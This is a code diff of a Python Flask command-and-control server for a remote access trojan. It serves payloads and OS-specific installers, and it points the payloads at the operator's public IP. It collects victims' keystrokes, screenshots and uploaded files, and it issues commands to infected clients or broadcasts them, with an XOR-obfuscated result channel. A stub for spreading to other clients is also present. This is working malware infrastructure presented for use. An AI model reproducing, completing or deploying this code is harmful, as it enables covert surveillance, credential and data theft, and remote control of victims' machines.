@@ -5,386 +5,275 @@ from blessed import Terminal
 import socket
 import signal
 import atexit
-
+import requests
 
 app = Flask(__name__)
 
+# === Paths and Global Config ===
 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
+INSTALLER_DIR = os.path.join(CURRENT_DIR, "installers")
 UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
-FILE_NAME = 'InMemLoader.exe'
-clean_name = 'clean.bat'
-forwarded = False
-EXE_DIR = r''
-MEM_DIR = r''
-port = 7777
+SCREENSHOTS_DIR = os.path.join(CURRENT_DIR, "screenshots")
 
 os.makedirs(CODE_DIR, exist_ok=True)
+os.makedirs(INSTALLER_DIR, exist_ok=True)
 os.makedirs(UPLOAD_DIR, exist_ok=True)
+os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 
-available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
 selected_code_file = None
+forwarded = False
+port = 7777
 
-# pages
-@app.route('/')
-def home():
-    return render_template('index.html')
+def get_public_ip():
+    try:
+        response = requests.get("https://api.ipify.org?format=text")
+        response.raise_for_status()
+        return response.text
+    except requests.RequestException as e:
+        return f"Error: {e}"
 
-@app.route('/dashboard')
-def dashboard():
-    return render_template('dashboard.html')
-
-# internal documentation
-
-@app.route('/documentation/payloads')
-def payloads():
-    if '.' in selected_code_file:
-       stripped_payload = selected_code_file.rsplit('.', 1)[0]
-    else:
-       stripped_payload = selected_code_file  # fallback if there's no dot
-
-    return render_template('payloads.html', payload=stripped_payload)
-
-@app.route('/documentation/rootkit')
-def rootkit():
-    return render_template('rootkit.html')
-
-@app.route('/documentation/C2')
-def C2():
-    return render_template('c2.html')
-
-
-def info(message):
+# === Helper Functions ===
+def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+def info(message=""):
+    clear_screen()
     print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
-    print("  ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
-    print("  ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
-    print("  ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
-    print("  ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
-    print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
-    if (message == ''):
-        return True
-    else:
-       print("==========  " + f"{message}" + "  =========")
+    print(" ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
+    print(" ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
+    print(" ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
+    print(" ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
+    print(" ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
+    if message:
+        print(f"\n==========  {message}  =========\n")
     time.sleep(0.5)
 
-if not os.path.exists('screenshots'):
-    os.makedirs('screenshots')
-
-@app.route('/upload', methods=['POST'])
-def upload_screenshot():
+def get_local_ip():
     try:
-        # Get the file from the request
-        file = request.files['file']
-        
-        if file:
-            # Save the image to the 'screenshots' folder with a unique name
-            file_path = os.path.join('screenshots', f"screenshot_{int(time.time())}.jpg")
-            file.save(file_path)
-            return "Screenshot received successfully!", 200
-        else:
-            return "No file received.", 400
-    except Exception as e:
-        return f"Error: {str(e)}", 500
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
 
-def adjust_payload():
-    global forwarded, available_code_files
-    # Get the public IP or local IP based on the forwarded flag
-    ip_address = "127.0.0.1"  # default local IP
-    if forwarded:
-        ip_address = socket.gethostbyname(socket.gethostname())  # Get the local machine IP
-
-    # Iterate through all payload files in the directory
-    for file_name in available_code_files:
-        file_path = os.path.join(CODE_DIR, file_name)
-
-        # Read the file and replace the URL
-        with open(file_path, "r") as file:
-            content = file.read()
-
-        # Modify the URL in the selected code file
-        new_content = content.replace("URL_PLACEHOLDER", f"http://{ip_address}:{port}")
-
-        # Write the changes back to the file
-        with open(file_path, "w") as file:
-            file.write(new_content)
-
-        print(f"[*] Adjusted URL in {file_name} to {ip_address}")
+def adjust_payloads():
+    ip = get_public_ip() if forwarded else "127.0.0.1"
+    for directory in [CODE_DIR, INSTALLER_DIR]:
+        for fname in os.listdir(directory):
+            fpath = os.path.join(directory, fname)
+            if os.path.isfile(fpath):
+                try:
+                    with open(fpath, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                    new_content = content.replace("URL_PLACEHOLDER", f"http://{ip}:{port}")
+                    with open(fpath, 'w', encoding='utf-8') as f:
+                        f.write(new_content)
+                    print(f"[+] Adjusted {fname} with {ip}")
+                except Exception as e:
+                    print(f"[!] Failed to adjust {fname}: {e}")
 
 def revert_payloads():
-    global forwarded, available_code_files
-    ip_address = "127.0.0.1"
-    if forwarded:
-        ip_address = socket.gethostbyname(socket.gethostname())
-
-    for file_name in available_code_files:
-        file_path = os.path.join(CODE_DIR, file_name)
-        with open(file_path, "r") as file:
-            content = file.read()
-
-        new_content = content.replace(f"http://{ip_address}:{port}", "URL_PLACEHOLDER")
-
-        with open(file_path, "w") as file:
-            file.write(new_content)
-
-        print(f"[*] Reverted URL in {file_name} to placeholder")
+    ip = get_public_ip() if forwarded else "127.0.0.1"
+    for directory in [CODE_DIR, INSTALLER_DIR]:
+        for fname in os.listdir(directory):
+            fpath = os.path.join(directory, fname)
+            if os.path.isfile(fpath):
+                try:
+                    with open(fpath, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                    new_content = content.replace(f"http://{ip}:{port}", "URL_PLACEHOLDER")
+                    with open(fpath, 'w', encoding='utf-8') as f:
+                        f.write(new_content)
+                    print(f"[+] Reverted {fname}")
+                except Exception as e:
+                    print(f"[!] Failed to revert {fname}: {e}")
 
 def handle_shutdown(signum, frame):
-    print("\n[*] Caught shutdown signal. Cleaning up...")
+    print("\n[*] Shutting down. Cleaning up...")
     revert_payloads()
-    print("[*] Cleanup complete. Exiting.")
-    os.system('cls' if os.name == 'nt' else 'clear')
-    info("hope to see you again soon :)")
+    info("Hope to see you again soon :)")
     exit(0)
 
-# Register handlers for SIGINT (Ctrl+C) and SIGTERM
 signal.signal(signal.SIGINT, handle_shutdown)
 signal.signal(signal.SIGTERM, handle_shutdown)
-
-# Optional: Also register with atexit for non-signal exits
 atexit.register(revert_payloads)
 
-
 def ask_if_forwarded():
-    global forwarded  # Make sure we're modifying the global variable
-    # print("Do you have your port open?")
+    global forwarded
     term = Terminal()
-
-    menu = ['Yes', 'No', 'Exit']
-    selected = 0
-    forwarded = None  # Initialize the variable
+    options = ["Yes", "No", "Exit"]
+    idx = 0
 
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
-        print(term.clear)      
         while True:
-            print(term.move_yx(0, 0) + term.bold("==== Do you have a forwarded port (7777)? ====\n"))
-            for i, item in enumerate(menu):
-                if i == selected:
-                    print(term.underline + item + term.normal)
-                else:
-                    print(item)
-
+            print(term.clear + term.move_yx(0, 0) + term.bold("Do you have a forwarded port (7777)?\n"))
+            for i, option in enumerate(options):
+                print(term.reverse(option) if i == idx else option)
             key = term.inkey()
-
-            if key.name == 'KEY_UP' and selected > 0:
-                selected -= 1
-            elif key.name == 'KEY_DOWN' and selected < len(menu) - 1:
-                selected += 1
-            elif key.name == 'KEY_ENTER' or key == '\n':
-                # Process the selection
-                if menu[selected] == 'Yes':
-                    forwarded = True
-                elif menu[selected] == 'No':
-                    forwarded = False
-                elif menu[selected] == 'Exit':
-                    print(term.move_yx(0, len(menu) + 1) + "Exiting...")
-                    break  # Exit the loop and function
-
-                # Once an option is selected, break the loop
+            if key.name == "KEY_UP":
+                idx = (idx - 1) % len(options)
+            elif key.name == "KEY_DOWN":
+                idx = (idx + 1) % len(options)
+            elif key.name in ("KEY_ENTER", "\n"):
+                if options[idx] == "Exit":
+                    print("Exiting.")
+                    exit(0)
+                forwarded = options[idx] == "Yes"
                 break
 
-        # If 'Exit' is selected, we exit out of the program.
-        if forwarded is None:
-            print("No selection made. Exiting...")
-            exit(0)  # Exit the program if no selection is made
-
-@app.route('/download', methods=['GET'])
-def download_exe():
-    filename = 'install.exe'
-    file_path = os.path.join(EXE_DIR, filename)
-    if os.path.exists(file_path):
-        return send_from_directory(EXE_DIR, filename, as_attachment=True)
-    else:
-        return "install.exe not found", 404
-
-@app.route('/InMemLoader.exe', methods=['GET'])
-def download_memloader():
-    filename = 'InMemLoader.exe'
-    file_path = os.path.join(MEM_DIR, filename)
-    if os.path.exists(file_path):
-        return send_from_directory(MEM_DIR, filename, as_attachment=True)
-    else:
-        return "InMemLoader.exe not found", 404
-
-
-# ==== Interactive Blessed Menu ====
 def choose_code_file():
     global selected_code_file
-    term = Terminal()
-    index = 0
-
-    menu_files = available_code_files + ['[ Exit ]']
-
-    if not available_code_files:
-        print("[-] No payloads found in /payload folder. Please add payloads first.")
+    files = os.listdir(CODE_DIR)
+    if not files:
+        print("[!] No payload files found in payloads/")
         exit(1)
+    term = Terminal()
+    idx = 0
+    files += ["[Exit]"]
 
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
-        print(term.clear)
         while True:
-            print(term.move_yx(0, 0) + term.bold("==== Select a payload ====\n"))
-            for i, file in enumerate(menu_files):
-                if i == index:
-                    print(term.reverse(file))
-                else:
-                    print(file)
-
+            print(term.clear + term.bold("Select a payload:\n"))
+            for i, f in enumerate(files):
+                print(term.reverse(f) if i == idx else f)
             key = term.inkey()
-
-            if key.name == 'KEY_UP':
-                index = (index - 1) % len(menu_files)
-            elif key.name == 'KEY_DOWN':
-                index = (index + 1) % len(menu_files)
-            elif key.name in ('KEY_ENTER', '\n'):
-                selected = menu_files[index]
-                if selected == '[ Exit ]':
-                    print(term.clear + "[*] Exiting...")
-                    time.sleep(0.5)
+            if key.name == "KEY_UP":
+                idx = (idx - 1) % len(files)
+            elif key.name == "KEY_DOWN":
+                idx = (idx + 1) % len(files)
+            elif key.name in ("KEY_ENTER", "\n"):
+                if files[idx] == "[Exit]":
                     exit(0)
-                else:
-                    selected_code_file = selected
-                    print(term.clear + f"[+] Selected: {selected_code_file}")
-                    time.sleep(1)
-                    break
+                selected_code_file = files[idx]
+                print(f"[+] Selected: {selected_code_file}")
+                time.sleep(1)
+                break
 
+# === XOR Helper ===
+def xor(data, key="nullbeacon"):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
 
-# ==== Flask Routes ====
+# === Flask Routes ===
+clients = {}
+current_cmd = ""
+last_result = ""
+
+@app.route("/")
+def home():
+    return render_template("index.html")
+
+@app.route("/dashboard")
+def dashboard():
+    return render_template("dashboard.html")
+
+@app.route("/documentation/payloads")
+def payloads_doc():
+    if not selected_code_file:
+        return "No payload selected"
+    stripped = selected_code_file.split('.')[0]
+    return render_template("payloads.html", payload=stripped)
+
+@app.route("/upload", methods=["POST"])
+def upload_screenshot():
+    file = request.files.get("file")
+    if file:
+        filename = f"screenshot_{int(time.time())}.jpg"
+        file.save(os.path.join(SCREENSHOTS_DIR, filename))
+        return "OK"
+    return "No file", 400
+
 @app.route("/code")
 def serve_code():
     if not selected_code_file:
         return "No code file selected.", 500
     try:
-        with open(os.path.join(CODE_DIR, selected_code_file), 'r', encoding='utf-8') as f:
-            return Response(f.read(), mimetype='text/plain')
+        with open(os.path.join(CODE_DIR, selected_code_file), "r", encoding="utf-8") as f:
+            return Response(f.read(), mimetype="text/plain")
     except Exception as e:
-        return f"Error reading file: {str(e)}", 500
+        return f"Error: {e}", 500
 
+@app.route("/install")
+def install():
+    ua = request.headers.get("User-Agent", "").lower()
+    script = "installer/install.ps1" if "windows" in ua else "installers/install.sh"
+    path = os.path.join(CURRENT_DIR, script)
+    return send_file(path, as_attachment=True) if os.path.exists(path) else abort(404)
 
-@app.route('/install', methods=['GET'])
-def installer():
-    user_agent = request.headers.get('User-Agent', '').lower()
-
-    # Get the directory of the current file (Flask app)
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-
-    if 'windows' in user_agent:
-        script_path = os.path.join(base_dir, 'install.ps1')
-    elif 'linux' in user_agent or 'ubuntu' in user_agent or 'macintosh' in user_agent or 'darwin' in user_agent:
-        script_path = os.path.join(base_dir, 'install.sh')
-    else:
-        abort(400, description="Unsupported OS or unable to detect")
-
-    if not os.path.exists(script_path):
-        abort(404, description=f"{os.path.basename(script_path)} not found")
-
-    return send_file(script_path, as_attachment=True)
-
-@app.route('/clean', methods=['GET'])
+@app.route("/clean")
 def clean():
-    try:
-        file_path = os.path.join(CURRENT_DIR, clean_name)
-        if not os.path.exists(file_path):
-            return jsonify({'status': 'error', 'message': f'{clean_name} not found on the server.'}), 404
-        return send_from_directory(CURRENT_DIR, clean_name, as_attachment=True)
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    path = os.path.join(CURRENT_DIR, "clean.bat")
+    return send_from_directory(CURRENT_DIR, "clean.bat", as_attachment=True) if os.path.exists(path) else abort(404)
 
-def xor(data, key="nullbeacon"):
-    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
-
-# ==== Client State ====
-clients = {}
-current_cmd = ""
-last_result = ""
-
-@app.route('/log', methods=['POST'])
+@app.route("/log", methods=["POST"])
 def log():
-    raw_data = request.form.get("data", "")
-    
-    # Just log the raw data without timestamp
+    raw = request.form.get("data", "")
     with open("keylog.log", "a", encoding="utf-8") as f:
-        f.write(raw_data)  # Ensure no extra newline is added here
-
-    return "OK", 200
-
-@app.route('/client_info', methods=['POST'])
-def update_client_info():
-    client_id = request.data.decode()
-    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
-    print(f"[*] Client {client_id} updated or connected.")
+        f.write(raw)
     return "OK"
 
+@app.route("/client_info", methods=["POST"])
+def update_client_info():
+    cid = request.data.decode()
+    clients[cid] = {"ip": request.remote_addr, "last_seen": time.time()}
+    print(f"[+] Client {cid} from {request.remote_addr}")
+    return "OK"
 
-@app.route('/get', methods=['GET'])
+@app.route("/get")
 def get_command():
     return current_cmd
 
-
-@app.route('/set', methods=['POST'])
+@app.route("/set", methods=["POST"])
 def set_command():
     global current_cmd
     current_cmd = request.data.decode()
     return "OK"
 
-
-@app.route('/result', methods=['POST'])
-def post_result():
+@app.route("/result", methods=["POST"])
+def result():
     global last_result
-    encrypted = request.data.decode()
-    last_result = xor(encrypted)
+    last_result = xor(request.data.decode())
     return "OK"
 
-
-@app.route('/last', methods=['GET'])
-def get_last_result():
+@app.route("/last")
+def last():
     return last_result or "[*] No result yet."
 
-
-@app.route('/upload', methods=['POST'])
+@app.route("/upload_file", methods=["POST"])
 def upload_file():
-    file = request.files.get('file')
+    file = request.files.get("file")
     if file:
-        path = os.path.join(UPLOAD_DIR, file.filename)
-        file.save(path)
-        print(f"[+] File uploaded: {file.filename}")
+        file.save(os.path.join(UPLOAD_DIR, file.filename))
         return "OK"
-    return "No file"
+    return "No file", 400
 
+@app.route("/download/<filename>")
+def download(filename):
+    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
 
-@app.route('/broadcast', methods=['POST'])
-def broadcast_command():
+@app.route("/broadcast", methods=["POST"])
+def broadcast():
     global current_cmd
-    cmd = request.data.decode()
-    current_cmd = cmd
-    print(f"[!] Broadcasting command to all clients: {cmd}")
-    return "Broadcast sent"
+    current_cmd = request.data.decode()
+    print(f"[!] Broadcast: {current_cmd}")
+    return "OK"
 
-
-@app.route('/download/<filename>', methods=['GET'])
-def download_file(filename):
-    try:
-        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
-    except Exception:
-        return "File not found", 404
-
-
-@app.route('/spread', methods=['POST'])
+@app.route("/spread", methods=["POST"])
 def spread():
-    print("[*] Command received to spread RAT to all clients.")
-    for client_id, client_data in clients.items():
-        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
-    return "Spreading started."
+    print("[*] Spread called")
+    return "OK"
 
-
-@app.route('/clients', methods=['GET'])
+@app.route("/clients")
 def list_clients():
-    return {"clients": list(clients.keys())}
+    return jsonify(list(clients.keys()))
 
-# ==== Run Server ====
+# === Main Runner ===
 if __name__ == "__main__":
-
-    info('')
-    ask_if_forwarded()  # Ask if port is forwarded
-    adjust_payload()  # Adjust all payload files based on forwarding status
-    choose_code_file()  # Let the user choose a payload file
+    ask_if_forwarded()
+    info("Adjusting payloads...")
+    adjust_payloads()
+    choose_code_file()
+    info("Starting C2 Server")
     app.run(host="0.0.0.0", port=port)
